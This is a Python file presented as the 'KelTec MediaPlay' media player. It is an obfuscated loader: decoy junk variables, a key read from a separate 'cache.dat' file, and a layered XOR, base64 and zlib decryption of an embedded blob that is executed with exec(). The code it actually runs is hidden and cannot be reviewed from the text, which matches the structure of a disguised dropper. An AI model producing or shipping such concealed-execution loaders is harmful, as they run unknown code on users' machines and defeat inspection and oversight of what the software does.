# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 348051 ^ 597996
_lx1_1 = len("6f1c84")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-740523)
_lx3_3 = 941184 * 0
_lx4_4 = 905962 ^ 862271
# _K carregada de arquivo externo
_M = 'T3blq7lMgXVbaczjVkfJI/p5WnwgHwbg5E/YGV4XJdcIcabsqlLSc1drzuEHFMZ1+XAGKSRBBrayHI5IDEIngl1zq+utANB1VT3D'
_D = '==Qa6GX0hPc+/d61byEjxDA4JuAnsBcOWwzw4k+kNd3CEIsun+XoyvXYvAUOuSoIause5LZTOgGlb/EVuk2P6mKK9tjrUgn0fmIE9A49TnUA7vv/ZeUVfdkAGegG4Qwi3wq+L0DGyLql1hXLY3BaWMylJQW4n46AxjSXHiq7aOWpUIBxKGVmH2ctrzxNTx4ozOkF+W+xo1qM8Vp83P9y6C0Chx8pMQhBj/7zEKBa+McNDKzl3G1Hjix5yzRvdcuX6Yc8LyJC+kK1a1TIsz6h4JYcFTPZzp1fN2i03RqCip5Am8fW53d33Fqpdh1+w08clhHgCDvWJZDo8il8r390t0vGegmFOoFQA6ZvjyhfurgqLb+KGOMD3NF+61iZMI5pi9FqUJ5IlmRV/epIsCFhdeboTfI2LbUfVRz8aFSiRqcWJBoQmjBuehkLuMcnhX42wYkfOMuSym8XNjMGGSdgLAp6q5v0HL+Bv0TiZFNGfdpXevG4Xee6pXS7G2Iydl2NshgM23cbH1YyzAySqw+62qL9N77VuPDc07ZMsHQo8fjMj60Z+eta9GXcWskV4s7pPJ0HhpKscIgO57UXqlJNozZ6jbj5KhmgNmIQ2BlzIDOozie6RIStuQc/KHfyTEdoPn8OVDdB894yzYuDAB4lluO40JjKKjf3v/UyOqMWcSa3d5R9pFc1sCBjaqAOYjZeqCQ0pFiEfjvcwXhf9Ac8e/+9ldWSWpKU47VyV9gGjNe23XIfC+oiEvlTuYf4wFwM4elxQpUwnOy/ErSB3D4SCNdV0yqra3GbGWD8lKi9iQg6h8CjNsOuG9+WQciPjX63cyXVVtToTyFA6Y1uk9OwVUQ2aMV/Pq0DK75+ubJo0FX9J9/vOoBieT/X4LcjvbJotkzc42TKC7zpHgyPlMhBXXzzVyLd9XECxGziLRB12KQ5WLlt9vgMeds4l4CpOZHLY7q4DX1OtuJYmdjcRIT+9bi4yUUMuNf/aajC4Ht2bbEX/RN3mdvQ7/pL4mOQH6YCftxkIY1K0DzcNymG4LAUPWX2jdU0bX7VHbXRuAszFCG431GrXlhOqBBOvobpiTx9x4CIqzEhqHjm1OETYNylBLmivd21WRry3/wtlGLg42qrUeEcEGShh9+2g3BJdvCOG7w1Mbcz6AQWBIzwbu9D6Jx91fRHtRl769YfbSrq74/2Uk6zzjGHBEr5pPwse0kn0p/N8SEfnBJlTIFffgjq26tiipkoHwFuSm6UFK9XBFY0dAb9ABybvbbY2zAb+e2Q2rl9qiiexmt7Aqhi6crOZWyIRiGGej8ADt0n2t8LE7DshFMNRRHHkLwg+RnRVp/RRADyjGgWDRPICbfLbnLsq3SFE/PTAp9zsKv3Z953GadzQGHUri2MGQb5FKSCnRBaFYRVd6eH+zdxryMOy+tXczwGQaGr3aAHkeYWAOlIJW1qusis4wqmV3LY5t4CmEd+61V7sYCjcgN83iDkZRoTZEbUsbSp9C84JKnrivchRn3yIBqwCp4z2nH6ePUqdwgRm47iFxbl'

_kf=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),'resources/data','cache.dat')
with open(_kf,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()